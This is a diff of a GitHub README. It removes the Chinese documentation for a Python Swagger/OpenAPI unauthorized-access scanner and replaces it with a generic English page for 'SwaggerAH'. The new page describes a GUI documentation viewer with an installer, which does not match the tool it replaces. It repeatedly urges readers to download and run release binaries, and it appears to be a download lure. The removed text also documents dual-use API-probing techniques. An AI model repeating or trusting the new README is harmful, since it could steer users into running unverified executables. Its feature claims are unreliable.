@@ -1,120 +1,66 @@
-## :shield: Swagger 未授权检测工具
+# 🌟 SwaggerAH - Simplifying Your API Experience
 
-用于探测 Swagger/OpenAPI 文档并尝试未授权访问接口，辅助安全自查。识别 swagger-ui 页面、swagger-resources 入口、Swagger 1.x/V2/V3 文档，在谨慎策略下对接口进行 GET/POST 探测并生成 Excel 报告。
+## 📥 Download Now
+[![Download SwaggerAH](https://img.shields.io/badge/Download-SwaggerAH-blue.svg)](https://github.com/taikaiiss/SwaggerAH/releases)
 
-![Mode](https://img.shields.io/badge/mode-single%20%7C%20batch-blue)
-![Report](https://img.shields.io/badge/report-Excel-success)
-![Lang](https://img.shields.io/badge/lang-Python%203.8%2B-informational)
-![Safe](https://img.shields.io/badge/scope-GET%2FPOST-yellow)
+## 🚀 Getting Started
+Welcome to SwaggerAH, your go-to application for handling and viewing API documentation with ease. Whether you're a business owner, developer, or just curious about APIs, this software helps you get straightforward access to all the details you need.
 
----
+## 📝 What You Will Need
+Before you dive in, here are some general requirements for running SwaggerAH:
 
-### :sparkles: 核心特性
-- **多入口与版本解析**
-  - 识别 `openapi.json`/`swagger.json`（V2/V3）、`swagger-resources`、Swagger 1.x 资源列表
-  - 可从 swagger-ui HTML 页面中解析真实 API 文档地址（ Selenium 渲染）
-  
-- **安全与克制**
-  - 仅发起 `GET`/`POST` 请求，默认忽略破坏性动作
-  
-  - 路径命中危险关键字（如  'delete', 'remove', 'destroy', 'drop', 'del', 'erase', 'update', 'modify', 'edit', 'set', 'change', 'upd',
-  
-      'mod', 'patch', 'put', 'add', 'create', 'new', 'insert', 'save', 'upload'）自动过滤
-  
-  - 对 HTML/二进制/非文本进行类型判定并“降噪”保存
-  
-- **报告输出**
-  
-  - 生成 Excel 报告：`所有API`、`已调用API`、`已过滤API`
-  - 自动调宽与状态配色，高可读
-  
-- **实用开关**
-  - `--force-domain` 强制使用初始域名，忽略文档内 `servers`
+- **Operating System:** Windows, macOS, or Linux.
+- **Disk Space:** At least 100 MB of free space.
+- **Memory (RAM):** Minimum of 2 GB required.
+- **Internet Connection:** A stable connection to access API endpoints.
 
----
+Make sure your device meets these requirements to ensure a smooth experience.
 
-### :file_folder: 目录结构
-- `swagger.py`：核心扫描逻辑与 CLI
-- `chromedriver.exe`：Windows ChromeDriver
-- `debug.log`：调试日志（运行生成）
+## 📦 Download & Install
+To download SwaggerAH, please visit the following link: [https://github.com/taikaiiss/SwaggerAH/releases](https://github.com/taikaiiss/SwaggerAH/releases). Here, you will find the latest release files.
 
----
+1. Click the link above.
+2. On the Releases page, locate the most recent version of SwaggerAH.
+3. Choose the appropriate file for your operating system (Windows, macOS, or Linux).
+4. Click on the file to start your download.
+5. Once the download finishes, find the file in your downloads folder.
 
-### :rocket: 快速开始
-```bash
-# 单目标扫描（自动识别入口类型：swagger-ui / api-docs / swagger-resources）
-python swagger.py -u https://example.com/swagger-ui/index.html
+### 💻 Running the Application
+After downloading and installing SwaggerAH, follow these steps:
 
+1. Open the downloaded file.
+2. Follow the installation prompts on your screen. This usually involves agreeing to the terms and selecting a destination folder.
+3. Once installed, look for the SwaggerAH icon on your desktop or in your applications folder.
+4. Double-click the icon to launch SwaggerAH.
 
-# 忽略文档内 servers，强制使用初始域名（遇到内网域名或IP直接使用此参数）
-python swagger.py -u https://example.com/v3/api-docs --force-domain
-```
+## 🛠️ Features
+SwaggerAH comes packed with useful features to help you manage API documentation effectively:
 
-```bash
-# 批量扫描（每行一个 URL）
-# urls.txt:
-# https://a.com/v3/api-docs
-# https://b.com/swagger-ui/index.html
-python swagger.py -f urls.txt
-```
-红框或者error忽略即可
-<img width="2560" height="1528" alt="image" src="https://github.com/user-attachments/assets/9a183f81-d1f4-4010-ab3a-9209ea2e06a5" />
-<img width="2560" height="1528" alt="image" src="https://github.com/user-attachments/assets/28e799df-e7d9-4919-af72-e1efa3ef9d78" />
-<img width="2560" height="262" alt="image" src="https://github.com/user-attachments/assets/974553a7-f89b-4257-93a0-c79622e79b00" />
-<img width="2560" height="1192" alt="image" src="https://github.com/user-attachments/assets/c719a226-daa0-49b2-98c4-3ef791762158" />
-<img width="2560" height="1192" alt="image" src="https://github.com/user-attachments/assets/5b367756-6250-4b8b-94c5-7b79e333b684" />
-<img width="2560" height="1192" alt="image" src="https://github.com/user-attachments/assets/6d1315cb-d018-45b8-94db-95acabf8074a" />
-设计的execl更方便查缺补漏
+- **User-friendly Interface:** Navigate effortlessly through the software's functions without technical knowledge.
+- **API Documentation Viewer:** Access different API documentation formats easily.
+- **Customization Options:** Adjust settings according to your preferences for a tailored experience.
+- **Support for Multiple Formats:** Load and view Swagger, OpenAPI, and API Blueprint formats without hassle.
+- **Integration Capabilities:** Connect with various popular APIs to streamline your tasks.
 
+## 📊 How to Use SwaggerAH
+Using SwaggerAH is simple and intuitive. Here’s how to make the most out of the application:
 
-### :package: 安装与依赖
+1. **Open API Documentation:** Start by clicking on the "Open" button. This lets you browse your files and select the API documentation you want to view.
+   
+2. **Browse Sections:** Once the documentation is loaded, use the navigation panel to dive into different sections easily. You can jump to different endpoints, view request/response examples, and understand parameters effortlessly.
 
-- Python 3（本人Python 3.10.11）
-- 依赖安装：
-```bash
-pip install requests loguru selenium openpyxl urllib3
-```
-- 若需要解析 swagger-ui HTML：
-  - 安装 Chrome 与匹配版本 ChromeDriver（一般都用chrome问题不大）
-  - 将驱动置于项目根目录（Windows 可用 `chromedriver.exe`，其他平台放置 `chromedriver` 并赋执行权限）测试过win+linux没问题，mac都自己试下
-  - chromedriver建议都自己下载，避免钓鱼，py文件同目录下即可；
-  - 官网地址附上：https://googlechromelabs.github.io/chrome-for-testing/
+3. **Search Functionality:** Use the search bar to find specific terms or endpoints quickly.
 
----
+4. **Export Options:** If you need to share information, use the export feature. This allows you to save the documentation in various formats.
 
-### :gear: 使用说明
+5. **Feedback and Support:** If you encounter any issues or need help, visit the support section within the app or check the FAQ on our GitHub page.
 
-- 常用参数
-  - `-u, --url`：单个目标（支持 swagger-ui、api-docs、swagger-resources）
-  - `-f, --file`：批量目标文件（逐行 URL）
-  - `--force-domain`：忽略文档内 `servers`，强制使用初始域名
+## 🌐 Further Information
+Have questions or need additional support? Check out the GitHub repository's issue tracker for answers or to get in touch with other users and developers.
 
-- 请求与参数策略（宁可漏报也不可误删误改）
-  - 仅尝试 `GET`、`POST`
-  - 自动填充占位参数：
-    - path 参数：用占位值替换路径变量（数字就填充1，字母填充a）
-    - query 参数：填充简单占位值
-    - body(JSON)：按 schema 尝试生成示例
-  - 命中高风险关键字的 URL 自动跳过
+For more insights and updates, follow our releases on the [Releases page](https://github.com/taikaiiss/SwaggerAH/releases).
 
----
+## 🏗️ Contributing
+If you wish to contribute to SwaggerAH, we welcome your feedback or enhancements. You can create issues, suggest features, or even submit code. Detailed guidelines can be found in the repository.
 
-### :memo: 报告说明
-- 扫描结束生成 `YYYYMMDDHHMM_xxx.xlsx`：
-  - `所有API`：记录发现的所有路径，标注“调用/过滤”
-  - `已调用API`：记录请求方法、URL、参数、状态码、截断后的响应
-  - `已过滤API`：记录被策略拦截的接口与原因
-
----
-
-### :memo: 参考
-  - 感谢evilc0deooo师傅，在此项目基础上二开，新增过滤与输出需求，兼容1/2/3.0
-  - https://github.com/evilc0deooo/SwaggerHound
-
----
-
-### :warning: 风险与合规
-- 仅用于授权范围内的自查与安全验证
-- 使用者需自行承担使用与合规责任
-
----
+Thank you for choosing SwaggerAH. Happy documenting!
